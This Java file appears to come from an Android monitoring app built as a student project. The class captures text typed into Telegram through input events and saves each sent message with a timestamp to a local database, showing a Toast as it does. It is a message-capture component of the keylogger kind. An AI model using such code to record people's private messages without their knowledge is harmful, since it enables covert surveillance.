package com.alberto.tfg.tormantos.analyzer.impl.messaging;

import android.content.Context;
import android.widget.Toast;

import com.alberto.tfg.tormantos.analyzer.Analyzer;
import com.alberto.tfg.tormantos.dto.messaging.TelegramDto;
import com.alberto.tfg.tormantos.manager.DBManager;
import com.alberto.tfg.tormantos.sto.EventSto;
import com.alberto.tfg.tormantos.utils.Helper;
import com.alberto.tfg.tormantos.utils.Strings;

import java.util.Date;

/**
 * Analyzer implementation for Telegram
 */
public class TelegramAnalyzerImpl implements Analyzer {

    private static final String TAG = "TelegramAnalyzerImpl";

    private Context context;

    private TelegramDto telegramDto;

    private String currentMessage;

    public TelegramAnalyzerImpl(Context context) {
        this.context = context;
    }

    /**
     * Method called by the eventHandler when the keyboard triggers the send text event
     *
     * @param sendTimestamp Date
     */
    public void confirmKeyboardInput(Date sendTimestamp) {

        if (this.currentMessage != null && !"".equals(this.currentMessage)) {
            this.telegramDto = new TelegramDto();
            this.telegramDto.setMessage(currentMessage);
            this.telegramDto.setTimestamp(sendTimestamp);
            storeObjectInRealm();

        }
    }

    @Override
    public void compute(EventSto eventSto) {

        switch (eventSto.getClassName()) {

            case Strings.WIDGET_EDITTEXT: // Writing
                if (!"".equals(Helper.getEventText(eventSto.getEvent()))) {
                    this.currentMessage = Helper.getEventText(eventSto.getEvent());
                }
                break;
        }
    }

    @Override
    public void storeObjectInRealm() {
        DBManager.saveOrUpdate(this.telegramDto);
        Toast.makeText(context, "Stored telegram:\n" + this.telegramDto.toString(), Toast.LENGTH_LONG).show();
        this.currentMessage = null;
    }
}
